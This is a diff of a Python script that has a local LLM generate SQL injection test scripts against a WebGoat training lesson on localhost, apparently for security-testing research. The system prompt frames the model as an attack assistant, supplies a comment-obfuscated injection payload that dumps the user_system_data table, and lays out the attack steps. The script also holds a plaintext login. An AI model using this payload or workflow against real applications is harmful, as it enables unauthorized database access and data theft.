@@ -9,29 +9,39 @@ please don't share false information.
 generate_attack_sys = """
 CONTEXT:
 
-You are an intelligent assistant experienced in Python programming. 
-Your goal is to assist in attacking vulnerable applications. 
+You are an intelligent assistant experienced in Python programming.
+Your goal is to assist in attacking vulnerable applications.
 Always answer as helpfully as possible within this context.
+
+RULES:
+1. The only successful payload for this task is: "cyber';/**/select/**/*/**/from/**/user_system_data;--". Only use this payload. Do NOT generate any other payload.
+2. Only use the requests library to do this task. Do NOT use BeautifulSoup or bs4 library in Python.
+3. The line "from requests.utils import dict_from_cookiejar" MUST NOT be there in the generated code.
+4. allow_redirects=True MUST be there.
+5. You MUST NOT access the cookies, get the data from response.json().
 
 INSTRUCTIONS:
 
-1. Import necessary modules: requests for handling HTTP requests and BeautifulSoup for parsing HTML content.
-2. Define the base URL: {base_url} and login URL according to the base url given by the user. For an example: login url: f'{base_url}/login'
-3. Create a session to persist cookies across requests.
-4. Retrieve the login page content and parse it to extract hidden fields.
-5. Define the user credentials which are username: {username} and password: {password}.
-6. Submit the login details to the login URL to authenticate.
-7. Check if the login is successful. The login is successful if the response does NOT contain the text "Invalid username and password" and has a status code of 200.
-8. Define the vulnerable endpoint for sql injection attack: {vulnerable_url}. the endpoint contains a field called "Name" where you can inject the payload.
-9. Create a payload for the SQL injection attack. Remember that the successful payload is "cyber';/**/select/**/*/**/from/**/user_system_data;--". This is the only successful payload possible for this application. Remember this carefully.
-10. Submit the SQL injection payload to the vulnerable endpoint.
-11. Check if the attack was successful by looking for specific keywords in the response. If the attack is successful, the frontend will show "You have succeeded" and status code will be 200.
-12. Implement robust error and exception handling to manage any issues that arise during testing.
+1. Import the "requests" module to handle HTTP requests. Do NOT use the BeautifulSoup (bs4) library. Do NOT use dict_from_cookiejar from requests.utils library. This is very important.
+2. Define the base URL: {base_url} and login URL according to the base URL given by the user. For example, the login URL should be: f'{base_url}/login'.
+3. Create a session to persist cookies across requests. 
+4. Retrieve the login page content.
+5. Define the user credentials with the provided username: {username} and password: {password}.
+6. Submit the login details to the login URL to authenticate. allow_redirects=True MUST be there.
+7. Check if the login is successful. Ensure the response does NOT contain the text "Invalid username and password" and has a status code of 200.
+8. Define the vulnerable endpoint for the SQL injection attack: {vulnerable_url}. Access the lesson page to set up the attack using session.get(f'{base_url}SqlInjectionAdvanced.lesson.lesson').
+9. Create a payload for the SQL injection attack. Remember that the successful payload is "cyber';/**/select/**/*/**/from/**/user_system_data;--". Do not use any other payload.
+10. Create a dictionary attack_data with the payload. The dictionary should contain a field called "userid_6a".
+11. Perform the SQL injection attack using session.post(vulnerable_url, data=attack_data). 
+12. Check if the attack was successful by looking for specific keywords in the response. You MUST NOT access the cookies, get the data from response.json(). The attack is successful if "lessonCompleted" is in response_data and response_data["lessonCompleted"]:
+        feedback = response_data["feedback"]
+        output = response_data["output"]
+13. Print the feedback and output, indicating the attack was successful.
+14. Close the session to end the interaction with the server.
 
-Use Python to generate and automate scripts for these tasks.
 Maintain a step-by-step approach and focus on achieving your goals with diligence and precision.
 This work is very important and requires attention to detail and methodical execution.
-Take a deep breath and think step by step then do the task.
+Take a deep breath, think step by step, and then do the task.
 """
 
 # Default user/human prompt for generating test cases
@@ -41,7 +51,7 @@ from langchain_openai import OpenAI
 from langchain_core.prompts import ChatPromptTemplate 
 import re
 
-llm = OpenAI(base_url="http://localhost:1234/v1", api_key="lm-studio", max_tokens=1000)
+llm = OpenAI(base_url="http://localhost:1234/v1", api_key="lm-studio", max_tokens=1000, temperature=0)
 
 
 def generate_attack_vector(base_url, vulnerable_url, username, password):
@@ -79,7 +89,7 @@ def generate_attack_vector(base_url, vulnerable_url, username, password):
     #Name and path for the test cases file
     test_cases_name = f"test_sql"
     test_file_name = f"test_sql7.py"
-    test_file_path = os.path.join("results", test_file_name)
+    test_file_path = os.path.join("./results", test_file_name)
 
     #Write the filtered test cases to the file
     with open(test_file_path, "w") as test_file:
@@ -95,7 +105,7 @@ def generate_attack_vector(base_url, vulnerable_url, username, password):
 base_url = "http://127.0.0.1:8080/WebGoat/"
 username = "sbombatkar"
 password = "Sneha#1234"
-vulnerable_url = "http://127.0.0.1:8080/WebGoat/start.mvc?username=sbombatkar#lesson/SqlInjectionMitigations.lesson/8"
+vulnerable_url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/attack6a"
 
 output = generate_attack_vector(base_url, vulnerable_url, username, password)
 
